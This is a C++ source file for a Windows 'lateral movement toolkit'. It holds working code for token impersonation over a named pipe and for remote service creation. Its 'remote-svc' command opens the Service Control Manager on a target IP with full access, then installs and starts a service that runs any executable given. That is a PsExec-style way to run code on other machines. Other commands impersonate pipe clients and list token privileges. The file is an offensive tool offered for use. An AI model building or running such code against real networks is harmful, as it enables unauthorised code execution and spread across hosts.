// lateral_toolkit.cpp — lateral movement toolkit
// Compile: g++ -std=c++17 -o lateral_toolkit.exe lateral_toolkit.cpp -ladvapi32
// Usage: lateral_toolkit.exe pipe-server | pipe-client | remote-svc <ip> <exe> <name> | tokens

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>
#include <vector>

// ─── pipe-server: named pipe with token impersonation ─────────────────────────

static void cmd_pipe_server() {
    const char* PIPE = "\\\\.\\pipe\\LateralPipe";
    printf("[*] Named pipe server: %s\n", PIPE);
    printf("    Waiting for client to connect (run pipe-client from another window)...\n");

    HANDLE hPipe = CreateNamedPipeA(
        PIPE,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 4096, 4096, 0, nullptr);
    if (hPipe == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] CreateNamedPipe failed: %lu\n", GetLastError()); return;
    }

    if (!ConnectNamedPipe(hPipe, nullptr)) {
        DWORD e = GetLastError();
        if (e != ERROR_PIPE_CONNECTED) {
            fprintf(stderr, "[!] ConnectNamedPipe failed: %lu\n", e);
            CloseHandle(hPipe); return;
        }
    }
    printf("[+] Client connected\n");

    // Impersonate client token
    if (ImpersonateNamedPipeClient(hPipe)) {
        char user[256]{}, domain[256]{};
        DWORD ulen = 256, dlen = 256;
        SID_NAME_USE snu;
        HANDLE hTok = nullptr;
        OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hTok);
        if (hTok) {
            BYTE buf[512]{};
            DWORD needed = 0;
            GetTokenInformation(hTok, TokenUser, buf, sizeof(buf), &needed);
            auto* tu = (TOKEN_USER*)buf;
            LookupAccountSidA(nullptr, tu->User.Sid, user, &ulen, domain, &dlen, &snu);
            printf("[+] Impersonating: %s\\%s\n", domain, user);
            CloseHandle(hTok);
        }
        RevertToSelf();
    } else {
        fprintf(stderr, "[!] ImpersonateNamedPipeClient failed: %lu\n", GetLastError());
    }

    // Echo loop
    char buf[4096]{};
    DWORD rd = 0;
    while (ReadFile(hPipe, buf, sizeof(buf)-1, &rd, nullptr) && rd > 0) {
        buf[rd] = 0;
        printf("[pipe] Recv: %s\n", buf);
        const char* reply = "ACK";
        DWORD written = 0;
        WriteFile(hPipe, reply, (DWORD)strlen(reply), &written, nullptr);
    }
    CloseHandle(hPipe);
}

// ─── pipe-client ──────────────────────────────────────────────────────────────

static void cmd_pipe_client() {
    const char* PIPE = "\\\\.\\pipe\\LateralPipe";
    printf("[*] Connecting to %s\n", PIPE);

    WaitNamedPipeA(PIPE, 5000);
    HANDLE hPipe = CreateFileA(PIPE, GENERIC_READ|GENERIC_WRITE, 0, nullptr,
                               OPEN_EXISTING, 0, nullptr);
    if (hPipe == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Cannot connect: %lu\n", GetLastError()); return;
    }
    DWORD mode = PIPE_READMODE_MESSAGE;
    SetNamedPipeHandleState(hPipe, &mode, nullptr, nullptr);
    printf("[+] Connected\n");

    const char* msg = "Hello from client";
    DWORD written = 0;
    WriteFile(hPipe, msg, (DWORD)strlen(msg), &written, nullptr);
    printf("[*] Sent: %s\n", msg);

    char buf[256]{};
    DWORD rd = 0;
    ReadFile(hPipe, buf, sizeof(buf)-1, &rd, nullptr);
    buf[rd] = 0;
    printf("[*] Reply: %s\n", buf);
    CloseHandle(hPipe);
}

// ─── remote-svc: install + run service on remote host ────────────────────────

static void cmd_remote_svc(const char* ip, const char* exe_path, const char* svc_name) {
    printf("[*] Installing service \"%s\" on \\\\%s\n", svc_name, ip);
    printf("    EXE: %s\n\n", exe_path);

    char target[256]{};
    snprintf(target, sizeof(target), "\\\\%s", ip);

    SC_HANDLE hScm = OpenSCManagerA(target, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hScm) {
        fprintf(stderr, "[!] OpenSCManager(%s) failed: %lu\n"
                "    (Need admin share access to target)\n", target, GetLastError());
        return;
    }
    printf("[+] SCM opened on %s\n", target);

    SC_HANDLE hSvc = CreateServiceA(hScm, svc_name, svc_name,
                                    SERVICE_ALL_ACCESS,
                                    SERVICE_WIN32_OWN_PROCESS,
                                    SERVICE_DEMAND_START,
                                    SERVICE_ERROR_IGNORE,
                                    exe_path,
                                    nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!hSvc) {
        DWORD e = GetLastError();
        if (e == ERROR_SERVICE_EXISTS)
            hSvc = OpenServiceA(hScm, svc_name, SERVICE_ALL_ACCESS);
        if (!hSvc) {
            fprintf(stderr, "[!] Service create failed: %lu\n", e);
            CloseServiceHandle(hScm); return;
        }
    } else printf("[+] Service created\n");

    if (!StartServiceA(hSvc, 0, nullptr)) {
        DWORD e = GetLastError();
        if (e == ERROR_SERVICE_ALREADY_RUNNING) printf("[*] Already running\n");
        else fprintf(stderr, "[!] StartService failed: %lu\n", e);
    } else printf("[+] Service started\n");

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
}

// ─── tokens: enumerate current process token privileges ──────────────────────

static void cmd_tokens() {
    printf("[*] Token privilege enumeration\n\n");
    HANDLE hTok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        fprintf(stderr, "OpenProcessToken failed: %lu\n", GetLastError()); return;
    }

    DWORD needed = 0;
    GetTokenInformation(hTok, TokenPrivileges, nullptr, 0, &needed);
    std::vector<BYTE> buf(needed);
    if (!GetTokenInformation(hTok, TokenPrivileges, buf.data(), needed, &needed)) {
        CloseHandle(hTok); return;
    }
    auto* tp = (TOKEN_PRIVILEGES*)buf.data();
    printf("%-45s  %s\n", "Privilege", "State");
    printf("%s\n", std::string(60, '-').c_str());
    for (DWORD i = 0; i < tp->PrivilegeCount; ++i) {
        char name[256]{};
        DWORD nlen = sizeof(name);
        LookupPrivilegeNameA(nullptr, &tp->Privileges[i].Luid, name, &nlen);
        DWORD attrs = tp->Privileges[i].Attributes;
        const char* state =
            (attrs & SE_PRIVILEGE_ENABLED)            ? "Enabled" :
            (attrs & SE_PRIVILEGE_ENABLED_BY_DEFAULT) ? "EnabledByDefault" :
                                                        "Disabled";
        printf("  %-43s  %s\n", name, state);
    }
    CloseHandle(hTok);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage:\n"
               "  lateral_toolkit.exe pipe-server\n"
               "  lateral_toolkit.exe pipe-client\n"
               "  lateral_toolkit.exe remote-svc <ip> <exe_path> <svc_name>\n"
               "  lateral_toolkit.exe tokens\n");
        return 1;
    }
    std::string cmd(argv[1]);
    if      (cmd == "pipe-server")                              cmd_pipe_server();
    else if (cmd == "pipe-client")                              cmd_pipe_client();
    else if (cmd == "remote-svc" && argc >= 5)                  cmd_remote_svc(argv[2], argv[3], argv[4]);
    else if (cmd == "tokens")                                   cmd_tokens();
    else { fprintf(stderr, "Unknown command.\n"); return 1; }
    return 0;
}
